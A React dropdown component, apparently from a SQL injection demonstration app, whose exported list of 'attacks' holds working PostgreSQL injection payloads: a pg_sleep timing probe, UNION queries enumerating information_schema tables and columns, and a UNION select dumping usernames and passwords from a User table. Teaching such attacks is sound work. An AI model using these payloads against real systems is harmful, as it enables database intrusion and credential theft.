import { Fragment } from "react";
import { Listbox, Transition } from "@headlessui/react";
import { CheckIcon, SelectorIcon } from "@heroicons/react/solid";

export const ATTACKS = [
  { id: 0, name: "None", value: "" },
  { id: 1, name: "Injection Possibility", value: "'" },
  { id: 2, name: "Database Type", value: "'; SELECT pg_sleep(5)--" },
  { id: 3, name: "All Products", value: "'--" },
  {
    id: 4,
    name: "Query Columns",
    value: "lorem' UNION (SELECT 1 , 'a', 'b', 'c', 2 , 'd', true)--",
  },
  {
    id: 5,
    name: "Tables in Database",
    value:
      "lorem' UNION(SELECT 1, TABLE_NAME, TABLE_SCHEMA, 'a', 2, 'b', true FROM information_schema.tables WHERE TABLE_SCHEMA = 'public')--",
  },
  {
    id: 6,
    name: "User Columns",
    value:
      "lorem' UNION(SELECT 1, COLUMN_NAME, 'a', 'b', 2, 'c', true FROM information_schema.columns WHERE TABLE_NAME = 'User')--",
  },
  {
    id: 7,
    name: "Username/Password",
    value: `lorem' UNION(SELECT 1, username, password, 'b', 2, 'c', true FROM "User")--`,
  },
];

function classNames(...classes) {
  return classes.filter(Boolean).join(" ");
}

export default function Select({ selected, setSelected }) {
  return (
    <Listbox
      as={"div"}
      className={"col-span-3"}
      value={selected}
      onChange={setSelected}
    >
      {({ open }) => (
        <>
          <Listbox.Label className="block text-sm font-medium text-gray-700">
            Attack
          </Listbox.Label>
          <div className="mt-1 relative">
            <Listbox.Button className="relative w-full bg-white border border-gray-300 rounded-md shadow-sm pl-3 pr-10 py-2 text-left cursor-default focus:outline-none focus:ring-1 focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
              <span className="flex items-center">
                <span className="ml-3 block truncate">{selected.name}</span>
              </span>
              <span className="ml-3 absolute inset-y-0 right-0 flex items-center pr-2 pointer-events-none">
                <SelectorIcon
                  className="h-5 w-5 text-gray-400"
                  aria-hidden="true"
                />
              </span>
            </Listbox.Button>
            <Transition
              show={open}
              as={Fragment}
              leave="transition ease-in duration-100"
              leaveFrom="opacity-100"
              leaveTo="opacity-0"
            >
              <Listbox.Options
                static
                className="absolute z-10 mt-1 w-full bg-white shadow-lg max-h-96 rounded-md py-1 text-base ring-1 ring-black ring-opacity-5 overflow-auto focus:outline-none sm:text-sm"
              >
                {ATTACKS.map((person) => (
                  <Listbox.Option
                    key={person.id}
                    className={({ active }) =>
                      classNames(
                        active ? "text-white bg-indigo-600" : "text-gray-900",
                        "cursor-default select-none relative py-2 pl-3 pr-9"
                      )
                    }
                    value={person}
                  >
                    {({ selected, active }) => (
                      <>
                        <div className="flex items-center">
                          <span
                            className={classNames(
                              selected ? "font-semibold" : "font-normal",
                              "ml-3 block truncate"
                            )}
                          >
                            {person.name}
                          </span>
                        </div>
                        {selected ? (
                          <span
                            className={classNames(
                              active ? "text-white" : "text-indigo-600",
                              "absolute inset-y-0 right-0 flex items-center pr-4"
                            )}
                          >
                            <CheckIcon className="h-5 w-5" aria-hidden="true" />
                          </span>
                        ) : null}
                      </>
                    )}
                  </Listbox.Option>
                ))}
              </Listbox.Options>
            </Transition>
          </div>
        </>
      )}
    </Listbox>
  );
}
